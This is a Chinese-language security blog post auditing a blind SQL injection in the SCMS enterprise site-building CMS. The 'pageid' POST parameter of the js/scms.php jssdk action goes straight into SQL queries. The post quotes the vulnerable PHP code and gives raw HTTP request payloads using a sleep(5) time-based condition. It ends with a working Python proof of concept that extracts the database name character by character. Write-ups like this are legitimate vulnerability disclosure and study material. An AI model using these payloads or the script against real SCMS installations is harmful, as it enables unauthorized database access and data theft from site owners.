---
title: "Scms Blind Injection"
date: 2019-07-16T13:02:33+08:00
draft: false
tags: ['代码审计']
categories: ['代码审计']
---
scms企业建站系统存在盲注
<!--more-->

闲着无聊，看到cnvd上昨天爆出来一个scms的注入，今天分析一下。

E:\code\php\scms\js\scms.php:173

```php
case "jssdk":
    $APPID = $C_wx_appid;
    $APPSECRET = $C_wx_appsecret;
    $info = getbody("https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=" . $APPID . "&secret=" . $APPSECRET, "");
    $access_token = json_decode($info)->access_token;
    $info = getbody("https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token=" . $access_token . "&type=jsapi", "");
    $ticket = json_decode($info)->ticket;
    $url = $_POST["url"];
    $noncestr = gen_key(20);
    $timestamp = time();
    $pageid = $_POST["pageid"];
    if ($pageid == "") {
        $pageid = 1;
    }
    switch ($_POST["pagetype"]) {
        case "index":
            $img = $C_ico;
            break;
        case "text":
            $img = getrs("select * from " . TABLE . "text where T_id=" . $pageid, "T_pic");
            break;
        case "product":
            $img = getrs("select * from " . TABLE . "psort where S_id=" . $pageid, "S_pic");
            break;
        case "productinfo":
            $img = splitx(getrs("select * from " . TABLE . "product where P_id=" . $pageid, "P_path"), "__", 0);
            break;
        case "news":
            $img = getrs("select * from " . TABLE . "nsort where S_id=" . $pageid, "S_pic");
            break;
        case "newsinfo":
            $img = getrs("select * from " . TABLE . "news where N_id=" . $pageid, "N_pic");
            break;
        case "form":
            $img = getrs("select * from " . TABLE . "form where F_id=" . $pageid, "F_pic");
            break;
        case "contact":
            $img = $C_ico;
            break;
        case "guestbook":
            $img = $C_ico;
            break;
    }

    $sign = sha1("jsapi_ticket=" . $ticket . "&noncestr=" . $noncestr . "&timestamp=" . $timestamp . "&url=" . $url);

    echo "{\"nonceStr\":\"" . $noncestr . "\",\"timestamp\":\"" . $timestamp . "\",\"signature\":\"" . $sign . "\",\"appid\":\"" . $APPID . "\",\"img\":\"http://" . $_SERVER["HTTP_HOST"] . $C_dir . $img . "\",\"ticket\":\"" . $ticket . "\"}";


    break;
```

可以看到`$pageid = $_POST["pageid"];`直接从POST中赋值，并且直接拼接到sql语句中。

过滤了一些东西，在这我给出一个payload

首先先判断pageid是否存在

```php
POST /js/scms.php?action=jssdk HTTP/1.1
Host: php.local
Content-Length: 30
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Origin: http://php.local
Content-Type: application/x-www-form-urlencoded
DNT: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://php.local/js/scms.php?action=jssdk
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: Ov1T_2132_saltkey=WKW5M101; Ov1T_2132_lastvisit=1562845214; PHPSESSID=erjg0os8p6mcdbjm7ug5b3qn34; XDEBUG_SESSION=PHPSTORM
Connection: close

pagetype=productinfo&pageid=78
```

如果存在返回包应该是包含了img字段并且有具体的图片地址，例如

```json
{"nonceStr":"merxK0Nu9iDC89zy4hGa","timestamp":"1563254507","signature":"5a8ed288f82d8292c5372636a57c43461dac8104","appid":"wxXXXXXXXXXX","img":"http://php.local/media/20151019120842158.jpg","ticket":""}
```

如果你的pageid是不存在的话，你的sleep时间将会是5的倍数

可以参考admintony师傅的文章[MySQL的逻辑运算符(and_or_xor)的工作机制研究](https://www.t00ls.net/articles-45590.html)

给出payload

```http
POST /js/scms.php?action=jssdk HTTP/1.1
Host: php.local
Content-Length: 89
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Origin: http://php.local
Content-Type: application/x-www-form-urlencoded
DNT: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://php.local/js/scms.php?action=jssdk
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: Ov1T_2132_saltkey=WKW5M101; Ov1T_2132_lastvisit=1562845214; PHPSESSID=erjg0os8p6mcdbjm7ug5b3qn34; XDEBUG_SESSION=PHPSTORM
Connection: close

pagetype=productinfo&pageid=78 %26%26 if(ascii(substring(database(),1,1))=115,sleep(5),1)
```

值得一提的是scms过滤了一系列关键字比如`select` `update` `'` `/*` `\`，那么具体的payload就靠大家发挥了

在这提供一个poc
```python
POC代码如下：
import requests
import urllib.parse

chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_0123456789'

url='http://local/js/scms.php'

def getDatabaseLength():
    print('开始爆破数据库长度。。。')
    for i in range(10):
        payload="1%0Aand%0Aif(length(database())>{},1,0)#".format(i)
        payload=urllib.parse.unquote(payload)
        data = {
            'action':'jssdk',
            'pagetype':'text',
            'pageid':payload
        }
        # print(data)
        # data = urllib.parse.unquote(data)
        # print(data)
        rs = requests.post(url=url,data=data)
        rs.encode='utf-8'
        # print(rs.text)
        if "20151019102732946.jpg" not in rs.text:
            print("数据库名的长度为：{}".format(i))
            return i

def getDatabaseName():
    print('开始获取数据库名')
    databasename = ''

    length = getDatabaseLength()
    # length = 4
    for i in range(1,length+1):
        for c in chars:
            payload='1%0Aand%0Aif(ascii(substr(database(),{},1))={},1,0)#'.format(i,ord(c))
            # print(payload)
            payload = urllib.parse.unquote(payload)
            data = {
                'action': 'jssdk',
                'pagetype': 'text',
                'pageid': payload
            }
            rs = requests.post(url=url, data=data)
            rs.encode = 'utf-8'
            # print(rs.text)
            if "20151019102732946.jpg" in rs.text:
                databasename = databasename+c
                print(databasename)

    return databasename
getDatabaseName()
```

